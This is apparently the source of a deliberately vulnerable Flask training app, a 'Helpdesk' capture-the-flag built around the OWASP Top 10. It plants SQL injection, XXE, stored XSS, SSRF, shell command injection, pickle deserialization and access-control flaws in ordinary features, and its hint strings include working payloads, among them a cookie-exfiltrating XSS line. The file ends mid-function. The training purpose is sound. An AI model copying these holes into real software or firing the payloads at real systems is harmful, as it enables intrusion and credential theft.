"""
SecDevSW Vulnerability Lab - "Helpdesk" challenge app (Python/Flask), v2.

INTENTIONALLY VULNERABLE. Localhost only.

A coherent vulnerable web app (not labelled demo routes). Vulnerabilities live in
normal features; the server auto-detects each solve, flips it green on /scoreboard,
and reveals the flag + a remediation note. Plus a day-3 HARDENING surface
(/hardening, /storage, logging) where trainees fix things in the source.

OWASP Top 10:2025 mapping in the challenge registry below.
"""
import base64
import hashlib
import os
import pickle
import re
import sqlite3
import subprocess
import threading
import time
import urllib.parse
import urllib.request
from functools import wraps
from html import escape

from argon2 import PasswordHasher
from lxml import etree
from flask import (Flask, Response, g, redirect, request, session, url_for,
                   render_template_string)
from markupsafe import Markup

app = Flask(__name__)
app.secret_key = "dev-not-secret"
# DB path + day-3 behaviour are env-driven so docker-compose.dev.yml can turn on a
# persistent DB + live reload without changing the default (days 1-2) behaviour.
DB = os.environ.get("HELPDESK_DB", "/tmp/helpdesk.db")
PERSIST = os.environ.get("HELPDESK_PERSIST") == "1"      # keep solves across restarts
USE_RELOADER = os.environ.get("HELPDESK_RELOAD") == "1"  # live code reload (day 3)
CMDI_FLAG_FILE = "/tmp/ctf_root.txt"
XXE_SECRET_FILE = "/tmp/xxe_secret.txt"
DESER_CANARY = "/tmp/deser_pwned"
ADMIN_COOKIE = "FLAG{stored_xss_admin_session_theft}"   # the loot the XSS must steal
PH = PasswordHasher()

# ---- day-3 hardening toggles the trainees implement in source --------------- #
# TODO(trainee): implement real security headers in after_request() below.
SECURITY_HEADERS_ENABLED = False
# Required response headers the /hardening self-check grades against:
REQUIRED_HEADERS = [
    "Content-Security-Policy", "Strict-Transport-Security", "X-Frame-Options",
    "X-Content-Type-Options", "Referrer-Policy", "Permissions-Policy",
]
# Security events /hardening expects to see in the audit log (A09):
EXPECTED_EVENTS = ["login_success", "login_failure", "access_denied", "admin_action"]

CRACK_WORDLIST = ["password", "123456", "password123", "letmein", "qwerty",
                  "admin", "secret", "hunter2", "welcome", "dragon"]
CRACK_TARGET = hashlib.md5("password123".encode()).hexdigest()   # the crack_md5 challenge


# --------------------------------------------------------------------------- #
# Challenge registry
# --------------------------------------------------------------------------- #
CHALLENGES = [
    dict(id="sqli_login", cat="A05", diff="easy", title="Authentication bypass",
         goal="Log in as admin without the password.",
         hints=["The login form builds a SQL query from your input.",
                "Comment out the password check.",
                "Username:  admin'--"],
         flag="FLAG{sqli_auth_bypass}",
         fix="Parameterise the query; never concatenate input into SQL."),
    dict(id="idor", cat="A01", diff="easy", title="Read the admin's ticket",
         goal="Read a ticket that belongs to the admin.",
         hints=["Tickets are at /ticket/<id> with sequential ids.",
                "Nothing checks that the ticket is yours.",
                "Walk the ids until you hit the admin's."],
         flag="FLAG{idor_broken_object_level_auth}",
         fix="Enforce an ownership check on every object access; deny by default."),
    dict(id="forced_admin", cat="A01", diff="easy", title="Forced browsing to admin",
         goal="Reach the admin panel as a normal user.",
         hints=["There's no admin link in your menu.",
                "The route still exists.",
                "Browse directly to /admin."],
         flag="FLAG{forced_browsing_missing_function_ac}",
         fix="Enforce function-level authorization server-side, not by hiding links."),
    dict(id="error_disclosure", cat="A02", diff="easy", title="Verbose error leak",
         goal="Make the printable-report feature leak an internal stack trace.",
         hints=["Every ticket has a 'Printable report' link -> /report?id=<n>.",
                "The id is used without validation.",
                "Give it a non-numeric id: /report?id=abc"],
         flag="FLAG{verbose_error_information_disclosure}",
         fix="Validate input; fail closed with a generic message; log details server-side."),
    dict(id="crack_md5", cat="A04", diff="easy", title="Crack a leaked hash",
         goal="On /storage, crack the leaked MD5 hash and submit the plaintext.",
         hints=["Unsalted MD5 of a common password.",
                "Hash it against a small wordlist.",
                "The plaintext is a very common password ending in 123."],
         flag="FLAG{weak_hash_cracked}",
         fix="Store passwords with Argon2id or PBKDF2 (salted, slow) - never MD5/SHA."),
    dict(id="sqli_union", cat="A05", diff="medium", title="Exfiltrate credentials",
         goal="Use ticket search to read the users table via UNION.",
         hints=["Search runs a LIKE query you can break out of.",
                "users has columns (name, password).",
                "' UNION SELECT name,password FROM users--"],
         flag="FLAG{sqli_union_based_exfiltration}",
         fix="Parameterise queries; least-privilege DB account."),
    dict(id="privesc", cat="A01", diff="medium", title="Privilege escalation",
         goal="Make your own account an administrator.",
         hints=["The profile form saves more fields than it shows.",
                "The server trusts every field you submit (mass assignment).",
                "POST role=admin to /profile."],
         flag="FLAG{mass_assignment_privilege_escalation}",
         fix="Bind only an allow-list of fields; never let the client set role."),
    dict(id="xxe", cat="A05", diff="medium", title="XXE file disclosure",
         goal="Import a ticket via XML and read a server-side file.",
         hints=["/ticket/import parses XML with external entities enabled.",
                "Define a DOCTYPE entity pointing at a file:// URL.",
                "<!DOCTYPE t [<!ENTITY x SYSTEM \"file://" + XXE_SECRET_FILE + "\">]> and use &x; in <title>."],
         flag="FLAG{xxe_file_disclosure}",
         fix="Disable DTD/external entities (defusedxml); prefer JSON."),
    dict(id="xss_stored", cat="A05", diff="medium", title="Steal the admin's cookie",
         goal="Store a comment that exfiltrates the admin's cookie to your collector.",
         hints=["Comments render unescaped; an admin bot views new comments every 2s.",
                "A pop-up proves nothing - you must exfiltrate document.cookie.",
                "<img src=x onerror=\"new Image().src='http://localhost:5000/collector?c='+document.cookie\">,"
                " then read /collector/log."],
         flag="FLAG{stored_xss_admin_session_theft}",
         fix="Context-aware output encoding on render; strict CSP; HttpOnly cookies."),
    dict(id="ssrf", cat="A01", diff="medium", title="SSRF via avatar fetch",
         goal="Make the server fetch an internal-only resource.",
         hints=["Profile fetches an avatar from a URL you give it.",
                "The server can reach things you can't (cloud metadata).",
                "avatar URL = http://127.0.0.1:5000/internal/metadata"],
         flag="FLAG{ssrf_internal_metadata_access}",
         fix="Allow-list outbound hosts; block loopback/link-local; use a fetch broker."),
    dict(id="cmdi", cat="A05", diff="hard", title="Command injection",
         goal="Run an OS command via the admin diagnostics tool.",
         hints=["Admin diagnostics pings a host you supply (needs admin).",
                "The host goes into a shell unquoted.",
                "host = 127.0.0.1; cat " + CMDI_FLAG_FILE],
         flag="FLAG{os_command_injection_rce}",
         fix="No shell; pass an argument vector; allow-list the input."),
    dict(id="deser", cat="A08", diff="hard", title="Insecure deserialization",
         goal="Get code execution by importing a crafted profile.",
         hints=["Profile export/import round-trips a pickled object.",
                "pickle.loads runs __reduce__ on untrusted input.",
                "Craft a pickle whose __reduce__ runs os.system('touch %s')." % DESER_CANARY],
         flag="FLAG{insecure_deserialization_rce}",
         fix="Never unpickle untrusted data; use JSON + a schema."),
]
BY_ID = {c["id"]: c for c in CHALLENGES}

# Human-readable OWASP 2025 category names for the challenge detail page.
CAT_NAMES = {
    "A01": "A01 Broken Access Control",
    "A02": "A02 Security Misconfiguration",
    "A04": "A04 Cryptographic Failures",
    "A05": "A05 Injection",
    "A08": "A08 Software & Data Integrity Failures",
}
# Where each challenge's vulnerable feature lives: (url, label, prerequisite note | None).
# Powers the "Start here" button so participants aren't hunting for the entry point.
START = {
    "sqli_login":       ("/login", "the sign-in form", None),
    "idor":             ("/tickets", "your ticket list, then walk the ids", None),
    "forced_admin":     ("/admin", "the admin panel URL directly", None),
    "error_disclosure": ("/report?id=1", "a ticket's Printable report", None),
    "crack_md5":        ("/storage", "the credential-storage page", None),
    "sqli_union":       ("/tickets", "the ticket search box", None),
    "privesc":          ("/profile", "your profile form", None),
    "xxe":              ("/ticket/import", "the XML ticket import", None),
    "xss_stored":       ("/tickets", "open a ticket and add a comment", None),
    "ssrf":             ("/profile", "the avatar-by-URL fetch", None),
    "cmdi":             ("/admin", "admin network diagnostics",
                         "Needs the admin role - solve Privilege escalation first."),
    "deser":            ("/profile", "profile export / import", None),
}


# --------------------------------------------------------------------------- #
# DB + solve engine
# --------------------------------------------------------------------------- #
def db():
    if "db" not in g:
        g.db = sqlite3.connect(DB)
        g.db.row_factory = sqlite3.Row
    return g.db


@app.teardown_appcontext
def _close(_):
    d = g.pop("db", None)
    if d:
        d.close()


def solve(cid):
    c = sqlite3.connect(DB)
    c.execute("INSERT OR IGNORE INTO solved(cid, ts) VALUES (?,?)", (cid, time.time()))
    c.commit()
    c.close()


def solved_ids():
    return {r["cid"] for r in db().execute("SELECT cid FROM solved")}


def audit(event, detail=""):
    # A09: deliberately thin. TODO(trainee): call this at the security-relevant
    # points (login success/failure, access_denied, admin_action, ...).
    c = sqlite3.connect(DB)
    c.execute("INSERT INTO audit(ts,event,detail) VALUES(?,?,?)", (time.time(), event, detail))
    c.commit()
    c.close()


def seed():
    c = sqlite3.connect(DB)
    c.executescript("""
        DROP TABLE IF EXISTS users; DROP TABLE IF EXISTS tickets;
        DROP TABLE IF EXISTS comments; DROP TABLE IF EXISTS solved;
        DROP TABLE IF EXISTS collector; DROP TABLE IF EXISTS cspreport; DROP TABLE IF EXISTS audit;
        CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT UNIQUE, password TEXT, role TEXT);
        CREATE TABLE tickets (id INTEGER PRIMARY KEY, owner TEXT, title TEXT, body TEXT);
        CREATE TABLE comments (id INTEGER PRIMARY KEY, ticket_id INT, author TEXT, body TEXT, seen INT DEFAULT 0);
        CREATE TABLE solved (cid TEXT PRIMARY KEY, ts REAL);
        CREATE TABLE collector (id INTEGER PRIMARY KEY, ts REAL, data TEXT);
        CREATE TABLE cspreport (id INTEGER PRIMARY KEY, ts REAL, report TEXT);
        CREATE TABLE audit (id INTEGER PRIMARY KEY, ts REAL, event TEXT, detail TEXT);
        INSERT INTO users(name,password,role) VALUES
          ('admin','S3cr3t-R00t-P@ss','admin'),('alice','alicepw','user'),('bob','bobpw','user');
        INSERT INTO tickets(owner,title,body) VALUES
          ('alice','VPN down','Cannot connect from home.'),
          ('bob','Printer jam','3rd floor printer offline.'),
          ('admin','Recovery codes','Internal only - do not share.');
    """)
    c.commit()
    c.close()


def prepare_runtime_files():
    # Loot files + the deser canary are NOT progress; (re)create them on every boot,
    # in both the default mode and the day-3 persistent mode.
    for p, content in ((CMDI_FLAG_FILE, "FLAG{os_command_injection_rce}\n"),
                       (XXE_SECRET_FILE, "FLAG{xxe_file_disclosure}\n")):
        with open(p, "w") as f:
            f.write(content)
    try:
        os.remove(DESER_CANARY)
    except OSError:
        pass


def current():
    if "uid" not in session:
        return None
    return db().execute("SELECT * FROM users WHERE id=?", (session["uid"],)).fetchone()


def login_required(f):
    @wraps(f)
    def w(*a, **k):
        if not current():
            return redirect(url_for("login"))
        return f(*a, **k)
    return w


# --------------------------------------------------------------------------- #
# Security headers (day-3 fix target)
# --------------------------------------------------------------------------- #
@app.after_request
def set_headers(resp):
    if SECURITY_HEADERS_ENABLED:
        # TODO(trainee): add the headers in REQUIRED_HEADERS here, e.g.:
        #   resp.headers["Content-Security-Policy"] = "default-src 'self'; report-uri /csp-report"
        #   resp.headers["X-Content-Type-Options"] = "nosniff"
        #   ... (see /hardening for the full checklist)
        pass
    return resp


# --------------------------------------------------------------------------- #
# UI
# --------------------------------------------------------------------------- #
# Page CSS + JS are served from /assets/* instead of being inlined, so a strict
# CSP (default-src 'self') can be applied without breaking the UI.
APP_CSS = """:root{color-scheme:light dark;--bg:#f6f7f9;--fg:#1a1d21;--card:#fff;--line:#e3e6ea;
--brand:#2b6cb0;--muted:#6b7280;--ok:#15803d;--okbg:#dcfce7;--no:#b91c1c;--nobg:#fee2e2;--chip:#eef2f7}
@media(prefers-color-scheme:dark){:root{--bg:#0f1216;--fg:#e6e8eb;--card:#171b21;--line:#2a2f37;
--brand:#5aa2e0;--muted:#9aa4b2;--okbg:#0f2e1c;--nobg:#2e1414;--chip:#1e242c}}
*{box-sizing:border-box}body{margin:0;font:15px/1.6 system-ui,sans-serif;background:var(--bg);color:var(--fg)}
nav{background:var(--card);border-bottom:1px solid var(--line);padding:.6rem 1rem;display:flex;
gap:.2rem;align-items:center;flex-wrap:wrap;position:sticky;top:0}
nav .brand{font-weight:700;margin-right:1rem;color:var(--brand)}
nav a{color:var(--fg);text-decoration:none;padding:.35rem .6rem;border-radius:6px}
nav a:hover{background:var(--chip)}nav .sp{margin-left:auto}nav .u{color:var(--muted);font-size:.9rem}
main{max-width:52rem;margin:1.5rem auto;padding:0 1rem}
.card{background:var(--card);border:1px solid var(--line);border-radius:10px;padding:1rem 1.2rem;margin:1rem 0}
h1,h2,h3{line-height:1.25}h2{margin-top:0}
a{color:var(--brand)}code,pre{background:var(--chip);border-radius:5px}
code{padding:.08em .35em}pre{padding:.7rem;overflow:auto}
input,textarea,select{font:inherit;padding:.5rem;width:100%;background:var(--card);color:var(--fg);
border:1px solid var(--line);border-radius:7px}label{font-size:.85rem;color:var(--muted)}
button,.btn{font:inherit;font-weight:600;padding:.5rem .9rem;border:0;border-radius:7px;
background:var(--brand);color:#fff;cursor:pointer}
table{border-collapse:collapse;width:100%}th,td{border:1px solid var(--line);padding:.45rem .6rem;text-align:left}
th{background:var(--chip)}.warn{color:var(--no);font-weight:600}
.pill{display:inline-block;padding:.1rem .5rem;border-radius:999px;font-size:.8rem;font-weight:600}
.pill.ok{background:var(--okbg);color:var(--ok)}.pill.no{background:var(--nobg);color:var(--no)}
.pill.warn{background:#fde68a;color:#92400e}td code{word-break:break-all;white-space:normal}
table.fixed{table-layout:fixed}table.fixed td:nth-child(2){width:60%}
.flag{color:var(--ok);font-weight:700}.muted{color:var(--muted)}.grid{display:grid;gap:.6rem}
tr.ok{background:var(--okbg)}.row{display:flex;gap:.5rem;align-items:center}
.btn.alt{background:#555}.searchform{flex:1;display:flex;gap:.5rem}
"""

HINTS_JS = """(function(){
  var hints = document.querySelectorAll('#hints .hint');
  var btn = document.getElementById('moreHint');
  var count = document.getElementById('hintCount');
  if(!hints.length){return;}
  var shown = 1;
  function update(){
    count.textContent = shown + ' of ' + hints.length + ' shown';
    if(shown >= hints.length){ btn.hidden = true; }
    else { btn.textContent = 'Show hint ' + (shown + 1); }
  }
  btn.addEventListener('click', function(){
    if(shown < hints.length){ hints[shown].hidden = false; shown++; update(); }
  });
  update();
})();
"""


BASE = """<!doctype html><html lang=en><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1"><title>Helpdesk</title>
<link rel=stylesheet href="/assets/app.css">
<nav><span class=brand>&#128737; Helpdesk</span>
<a href="/">Home</a><a href="/tickets">Tickets</a><a href="/storage">Storage</a>
<a href="/hardening">Hardening</a><a href="/collector/log">Collector</a><a href="/scoreboard">Scoreboard</a>
{% if user %}{% if user['role']=='admin' %}<a href="/admin">Admin</a>{% endif %}
<span class="sp u">{{user['name']}} &middot; {{user['role']}} &middot; <a href="/logout">logout</a></span>
{% else %}<span class="sp"><a href="/login">login</a> <a href="/register">register</a></span>{% endif %}
</nav><main>{{body|safe}}</main></html>"""


def page(body, **kw):
    return render_template_string(
        BASE, user=current(),
        body=render_template_string(body, user=current(), **kw))


# --------------------------------------------------------------------------- #
# Static assets (served by the app so the CSP can stay strict: no inline code)
# --------------------------------------------------------------------------- #
@app.route("/assets/app.css")
def asset_css():
    return Response(APP_CSS, mimetype="text/css")


@app.route("/assets/hints.js")
def asset_js():
    return Response(HINTS_JS, mimetype="application/javascript")


# --------------------------------------------------------------------------- #
# Auth
# --------------------------------------------------------------------------- #
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        u = request.form.get("username", "")
        p = request.form.get("password", "")
        # VULN (A05): username + password concatenated straight into SQL.
        q = "SELECT * FROM users WHERE name = '%s' AND password = '%s'" % (u, p)
        try:
            row = db().execute(q).fetchone()
        except Exception as e:
            return page("<div class=card><p class=warn>SQL error: {{e}}</p>"
                        "<a href=/login>back</a></div>", e=str(e))
        if row:
            session["uid"] = row["id"]
            real = db().execute("SELECT password FROM users WHERE name='admin'").fetchone()["password"]
            if row["name"] == "admin" and p != real:          # got in without the password
                solve("sqli_login")
            return redirect(url_for("index"))
        return page("<div class=card><p class=warn>Invalid credentials.</p><a href=/login>back</a></div>")
    return page("""<div class=card><h2>Sign in</h2><form method=post class=grid>
      <div><label>Username</label><input name=username autofocus></div>
      <div><label>Password</label><input name=password type=password></div>
      <div><button>Sign in</button></div></form>
      <p class=muted>Demo users: alice / alicepw, bob / bobpw</p></div>""")


@app.route("/register", methods=["GET", "POST"])
def register():
    if request.method == "POST":
        u, p = request.form.get("username", ""), request.form.get("password", "")
        try:
            db().execute("INSERT INTO users(name,password,role) VALUES(?,?, 'user')", (u, p))
            db().commit()
        except sqlite3.IntegrityError:
            return page("<div class=card><p class=warn>name taken</p></div>")
        return redirect(url_for("login"))
    return page("""<div class=card><h2>Register</h2><form method=post class=grid>
      <div><label>Username</label><input name=username></div>
      <div><label>Password</label><input name=password type=password></div>
      <div><button>Create account</button></div></form></div>""")


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))


@app.route("/")
def index():
    done = len(solved_ids())
    return page("""<div class=card><h2>Internal Helpdesk</h2>
      <p>Welcome{% if user %}, {{user['name']}}{% endif %}. Raise and track support tickets.</p>
      <p class=muted>Deliberately vulnerable training app &mdash; localhost only.
      You've solved {{done}} / {{total}} challenges.
      Start at the <a href=/scoreboard>scoreboard</a>.</p></div>""",
                done=done, total=len(CHALLENGES))


# --------------------------------------------------------------------------- #
# Tickets: IDOR, report (error disclosure), search (UNION), XXE import, XSS
# --------------------------------------------------------------------------- #
@app.route("/tickets")
@login_required
def tickets():
    rows = db().execute("SELECT * FROM tickets WHERE owner=?", (current()["name"],)).fetchall()
    return page("""<div class=card><h2>Your tickets</h2>
      <p class=row><a class=btn href=/ticket/new>+ New ticket</a>
      <a class="btn alt" href=/ticket/import>Import XML</a>
      <form action=/search class=searchform>
        <input name=q placeholder="search tickets"><button>Search</button></form></p>
      <ul>{% for t in rows %}<li><a href="/ticket/{{t['id']}}">#{{t['id']}} {{t['title']}}</a></li>{% endfor %}</ul>
      </div>""", rows=rows)


@app.route("/ticket/new", methods=["GET", "POST"])
@login_required
def ticket_new():
    if request.method == "POST":
        db().execute("INSERT INTO tickets(owner,title,body) VALUES(?,?,?)",
                     (current()["name"], request.form.get("title", ""), request.form.get("body", "")))
        db().commit()
        return redirect(url_for("tickets"))
    return page("""<div class=card><h2>New ticket</h2><form method=post class=grid>
      <div><label>Title</label><input name=title></div>
      <div><label>Body</label><textarea name=body rows=4></textarea></div>
      <div><button>Create</button></div></form></div>""")


@app.route("/ticket/<int:tid>")
@login_required
def ticket_view(tid):
    t = db().execute("SELECT * FROM tickets WHERE id=?", (tid,)).fetchone()
    if not t:
        return page("<div class=card><p>not found</p></div>")
    # VULN (A01 IDOR): no ownership check on object access.
    # Solve only on the goal: a non-admin reading the admin's ticket.
    if t["owner"] == "admin" and current()["name"] != "admin":
        solve("idor")
    cmts = db().execute("SELECT * FROM comments WHERE ticket_id=?", (tid,)).fetchall()
    return page("""<div class=card><h2>#{{t['id']}} {{t['title']}}</h2>
      <p class=muted>owner: {{t['owner']}} &middot;
      <a href="/report?id={{t['id']}}">Printable report</a></p>
      <p>{{t['body']}}</p><h3>Comments</h3>
      {% for c in cmts %}{{ render_comment(c['author'], c['body']) }}{% endfor %}
      <form method=post action="/ticket/{{t['id']}}/comment" class=grid>
      <textarea name=body rows=2 placeholder="add a comment"></textarea>
      <div><button>Comment</button></div></form></div>""", t=t, cmts=cmts,
                render_comment=render_comment)


def render_comment(author, body):
    """HTML for one comment. Used by the ticket page AND the admin bot, so the bot
    only "fires" if a payload survives rendering - fix it here and the XSS stops."""
    # VULN (A05 stored XSS): the comment body is inserted unescaped.
    return Markup("<p><b>%s:</b> %s</p>" % (escape(author), body))


@app.route("/ticket/<int:tid>/comment", methods=["POST"])
@login_required
def ticket_comment(tid):
    db().execute("INSERT INTO comments(ticket_id,author,body) VALUES(?,?,?)",
                 (tid, current()["name"], request.form.get("body", "")))
    db().commit()
    return redirect(url_for("ticket_view", tid=tid))


@app.route("/report")
@login_required
def report():
    rid = request.args.get("id", "1")
    secret_config = "DB_PASS=S3cr3t-R00t-P@ss"            # pretend config in scope
    # VULN (A02/A10): input used without validation; traceback shown to the client.
    try:
        n = int(rid)
        t = db().execute("SELECT * FROM tickets WHERE id=?", (n,)).fetchone()
        # ownership check: a report is not a backdoor to other people's tickets.
        if t and t["owner"] != current()["name"] and current()["role"] != "admin":
            return page("<div class=card><p class=warn>403 - not your ticket.</p></div>"), 403
        return page("<div class=card><h2>Report #{{n}}</h2><pre>{{t}}</pre></div>",
                    n=n, t=dict(t) if t else {})
    except ValueError:
        solve("error_disclosure")
        import traceback
        tb = traceback.format_exc() + "\nlocals: " + secret_config
        return page("<div class=card><h2 class=warn>Unhandled error</h2><pre>{{tb}}</pre></div>",
                    tb=tb), 500


@app.route("/search")
@login_required
def search():
    q = request.args.get("q", "")
    # VULN (A05 SQLi): LIKE query built by concatenation; UNION-able.
    sql = "SELECT title, body FROM tickets WHERE title LIKE '%" + q + "%'"
    try:
        rows = db().execute(sql).fetchall()
    except Exception as e:
        return page("<div class=card><p class=warn>SQL error: {{e}}</p></div>", e=str(e))
    # Solve only if a result cell IS another user's password (creds exfiltrated),
    # not a substring match - so registering a weak password can't fake it.
    others = {r["password"] for r in db().execute(
        "SELECT password FROM users WHERE id<>?", (current()["id"],))}
    if any(str(v) in others for r in rows for v in tuple(r) if v is not None):
        solve("sqli_union")
    return page("""<div class=card><h2>Search</h2><p><code>{{sql}}</code></p>
      <table><tr><th>col1</th><th>col2</th></tr>
      {% for r in rows %}<tr><td>{{r[0]}}</td><td>{{r[1]}}</td></tr>{% endfor %}</table></div>""",
                sql=sql, rows=rows)


@app.route("/ticket/import", methods=["GET", "POST"])
@login_required
def ticket_import():
    result = None
    if request.method == "POST":
        xml = request.form.get("xml", "").encode()
        try:
            # VULN (A05 XXE): external entities + DTD loading enabled.
            parser = etree.XMLParser(resolve_entities=True, load_dtd=True, no_network=True)
            root = etree.fromstring(xml, parser)
            title = (root.findtext("title") or "")
            body = (root.findtext("body") or "")
            result = {"title": title, "body": body}
            if "FLAG{xxe_file_disclosure}" in (title + body):
                solve("xxe")
        except Exception as e:
            result = {"error": str(e)}
    sample = ('<?xml version="1.0"?>\n<ticket><title>Hello</title><body>from XML</body></ticket>')
    return page("""<div class=card><h2>Import ticket from XML</h2>
      <form method=post class=grid><textarea name=xml rows=6>{{sample}}</textarea>
      <div><button>Import</button></div></form>
      {% if result %}<h3>Parsed</h3><pre>{{result}}</pre>{% endif %}</div>""",
                sample=sample, result=result)


# --------------------------------------------------------------------------- #
# Profile: mass-assignment privesc, SSRF, deserialization
# --------------------------------------------------------------------------- #
@app.route("/profile", methods=["GET", "POST"])
@login_required
def profile():
    u = current()
    if request.method == "POST":
        # VULN (A01 privesc): every submitted field is written (mass assignment).
        fields = {k: v for k, v in request.form.items() if k in ("password", "role")}
        for k, v in fields.items():
            db().execute("UPDATE users SET %s=? WHERE id=?" % k, (v, u["id"]))
        db().commit()
        if fields.get("role") == "admin" and u["role"] != "admin":
            solve("privesc")
        return redirect(url_for("profile"))
    return page("""<div class=card><h2>Profile: {{user['name']}}</h2>
      <p>Role: <b>{{user['role']}}</b></p>
      <form method=post class=grid><div><label>New password</label><input name=password></div>
      <div><button>Save</button></div></form></div>
      <div class=card><h3>Avatar by URL</h3>
      <form action=/profile/avatar class=grid><input name=url placeholder=http://...>
      <div><button>Fetch</button></div></form></div>
      <div class=card><h3>Export / import profile</h3>
      <p><a href=/profile/export>Export</a> (base64 blob)</p>
      <form method=post action=/profile/import class=grid>
      <input name=blob placeholder="base64 blob"><div><button>Import</button></div></form></div>""")


@app.route("/profile/avatar")
@login_required
def avatar():
    url = request.args.get("url", "")
    host = url.split("/")[2] if "://" in url else ""
    # VULN (A01 SSRF): server fetches an arbitrary user-supplied URL.
    if any(h in host for h in ("127.0.0.1", "localhost", "169.254.169.254", "0.0.0.0")):
        solve("ssrf")
    try:
        data = urllib.request.urlopen(url, timeout=3).read(2000).decode("utf-8", "replace")
    except Exception as e:
        data = "fetch error: %s" % e
    return page("<div class=card><h2>Fetched</h2><pre>{{d}}</pre></div>", d=data)


@app.route("/internal/metadata")
def internal_metadata():
    # "Cloud metadata": only answers loopback callers, so the flag really requires SSRF
    # (a trainee's browser reaches the container from the Docker gateway, not loopback).
    if request.remote_addr not in ("127.0.0.1", "::1"):
        return Response("forbidden: internal endpoint\n", status=403, mimetype="text/plain")
    return Response("instance-role: admin\nrecovery-code: FLAG{ssrf_internal_metadata_access}\n",
                    mimetype="text/plain")


@app.route("/profile/export")
@login_required
def export_profile():
    blob = base64.b64encode(pickle.dumps({"name": current()["name"], "role": current()["role"]}))
    return Response(blob, mimetype="text/plain")


@app.route("/profile/import", methods=["POST"])
@login_required
def import_profile():
    # VULN (A08): pickle.loads on untrusted input -> code execution.
    try:
        obj = pickle.loads(base64.b64decode(request.form.get("blob", "")))  # noqa: S301
        if os.path.exists(DESER_CANARY):
            solve("deser")
        return page("<div class=card><p>Imported: {{o}}</p></div>", o=escape(str(obj)))
    except Exception as e:
        return page("<div class=card><p class=warn>import error: {{e}}</p></div>", e=str(e))


# --------------------------------------------------------------------------- #
# Admin: forced browsing + command injection
# --------------------------------------------------------------------------- #
@app.route("/admin")
@login_required
def admin():
    # VULN (A01): reachable by anyone who knows the URL; only hidden from the menu.
    if current()["role"] != "admin":
        solve("forced_admin")
    return page("""<div class=card><h2>Admin panel</h2>
      <p class=muted>Admin-only area. (Solving is detected server-side; see the scoreboard.)</p>
      <h3>Network diagnostics</h3>
      <form action=/admin/ping class=grid><input name=host value=127.0.0.1>
      <div><button>Ping</button></div></form></div>""")


@app.route("/admin/ping")
@login_required
def admin_ping():
    # Function-level check: diagnostics need the admin role (escalate via privesc first).
    if current()["role"] != "admin":
        return page("<div class=card><p class=warn>403 - admin only.</p></div>"), 403
    host = request.args.get("host", "127.0.0.1")
    # VULN (A05): user input in a shell command string.
    out = subprocess.run("ping -c1 " + host, shell=True, capture_output=True, text=True)
    combined = out.stdout + out.stderr
    if "FLAG{os_command_injection_rce}" in combined:
        solve("cmdi")
    return page("<div class=card><h2>Diagnostics</h2><pre>{{o}}</pre></div>", o=combined)


# --------------------------------------------------------------------------- #
# Attacker collector (XSS exfil sink)
# --------------------------------------------------------------------------- #
@app.route("/collector")
def collector():
    c = request.args.get("c", "")
    if c:
        d = db()
        d.execute("INSERT INTO collector(ts,data) VALUES(?,?)", (time.time(), c))
        d.commit()
    return Response(b"", mimetype="image/gif")


@app.route("/collector/log")
def collector_log():
    rows = db().execute("SELECT ts,data FROM collector ORDER BY id DESC").fetchall()
    return page("""<div class=card><h2>Collector &mdash; received data</h2>
      <p class=muted>Your exfiltration sink. Point XSS payloads here.</p>
      {% if not rows %}<p>nothing yet</p>{% endif %}
      {% for r in rows %}<pre>{{r['data']}}</pre>{% endfor %}</div>""", rows=rows)


# --------------------------------------------------------------------------- #
# Credential storage hands-on (A04) + crack challenge
# --------------------------------------------------------------------------- #
def hash_scheme(scheme, pw):
    if scheme == "cleartext":
        return pw
    if scheme == "md5":
        return hashlib.md5(pw.encode()).hexdigest()
    if scheme == "sha256":
        return hashlib.sha256(pw.encode()).hexdigest()
    if scheme == "pbkdf2":
        return hashlib.pbkdf2_hmac("sha256", pw.encode(), b"per-user-salt", 200000).hex()
    if scheme == "argon2id":
        return PH.hash(pw)
    return "?"


def crack(h):
    for w in CRACK_WORDLIST:
        if hashlib.md5(w.encode()).hexdigest() == h or hashlib.sha256(w.encode()).hexdigest() == h:
            return w
    return None


def verdict(scheme, h):
    """Honest teaching verdict per scheme: (pill-class, label)."""
    if scheme == "cleartext":
        return ("no", "Plaintext - fully exposed")
    if scheme in ("md5", "sha256"):
        w = crack(h)
        if w:
            return ("no", "Cracked: %s" % w)
        return ("warn", "Fast hash - crackable offline")
    if scheme == "pbkdf2":
        return ("ok", "Salted + slow (200k) - resistant")
    if scheme == "argon2id":
        return ("ok", "Memory-hard - resistant")
    return ("warn", "?")


@app.route("/storage", methods=["GET", "POST"])
def storage():
    pw = request.form.get("pw", "password")
    schemes = ["cleartext", "md5", "sha256", "pbkdf2", "argon2id"]
    rows = [(s, hash_scheme(s, pw)) + verdict(s, hash_scheme(s, pw)) for s in schemes]
    submitted = request.form.get("plain")
    cracked_ok = submitted is not None and hashlib.md5(submitted.encode()).hexdigest() == CRACK_TARGET
    if cracked_ok:
        solve("crack_md5")
    return page("""<div class=card><h2>Credential storage</h2>
      <p class=muted>Enter a password and see how each scheme would store it, with an
      honest verdict. A quick wordlist is run against the fast hashes.</p>
      <form method=post class=row><input name=pw value="{{pw}}"><button>Hash it</button></form>
      <table class=fixed><tr><th>Scheme</th><th>Stored value</th><th>Verdict</th></tr>
      {% for s,h,cls,label in rows %}<tr><td>{{s}}</td><td><code>{{h}}</code></td>
      <td><span class="pill {{cls}}">{{label}}</span></td></tr>{% endfor %}</table>
      <p class=muted><span class="pill no">red</span> broken &middot;
      <span class="pill warn">amber</span> weak (fast, brute-forceable) &middot;
      <span class="pill ok">green</span> use this (salted + slow). Fix the app to store
      with Argon2id.</p></div>
      <div class=card><h3>Challenge: crack the leaked hash</h3>
      <p>A breach dumped this unsalted MD5. Recover the plaintext and submit it.</p>
      <p><code>{{target}}</code></p>
      <form method=post class=row><input type=hidden name=pw value="{{pw}}">
      <input name=plain placeholder="plaintext"><button>Submit</button></form>
      {% if submitted is not none %}<p class="{{'flag' if ok else 'warn'}}">
      {{'Correct - FLAG{weak_hash_cracked}' if ok else 'nope, keep trying'}}</p>{% endif %}</div>""",
                pw=escape(pw), rows=rows, target=CRACK_TARGET, submitted=submitted, ok=cracked_ok)


# --------------------------------------------------------------------------- #
# Hardening dashboard (day-3 defensive): headers self-check, CSP reports, audit
# --------------------------------------------------------------------------- #
@app.route("/csp-report", methods=["POST"])
def csp_report():
    d = db()
